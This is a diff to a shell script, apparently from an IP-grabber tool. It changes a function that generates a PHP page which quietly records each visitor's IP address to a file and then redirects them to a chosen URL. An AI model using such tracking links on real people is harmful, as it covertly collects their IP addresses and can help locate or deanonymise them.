@@ -46,29 +46,30 @@ ini_cloud(){
 make_php(){
     url=$1
 
-    cat <<"FIN" > ip.php
-    <?php
-    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
-        $ip_address = $_SERVER['HTTP_CLIENT_IP'];
-    }
+    cat > ip.php <<FIN
+        <?php
+        if (isset(\$_SERVER['HTTP_CLIENT_IP'])) {
+            \$ip_address = \$_SERVER['HTTP_CLIENT_IP'];
+        } 
+        
+        elseif (isset(\$_SERVER['HTTP_X_FORWARDED_FOR'])) {
+            \$ip_address = \$_SERVER['HTTP_X_FORWARDED_FOR'];
+        } 
+        
+        elseif (isset(\$_SERVER['REMOTE_ADDR'])) {
+            \$ip_address = \$_SERVER['REMOTE_ADDR'];
+        }
 
-    elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-        $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
-    }
+        header("Location: $url");
 
-    elseif (isset($_SERVER['REMOTE_ADDR'])) {
-        $ip_address = $_SERVER['REMOTE_ADDR'];
-    }
+        \$file = fopen("ip.txt", "a");
+        fwrite(\$file, "IP: " . \$ip_address);
+        fclose(\$file);
 
-    header("Location: $url");
+        exit();
+        ?>
+        FIN
 
-    $file = fopen("ip.txt", "a");
-    fwrite($file, "IP: " . $ip_address);
-    fclose($file);
-    
-    exit();
-    ?>
-    FIN
 }
 
 loc=$(pwd)
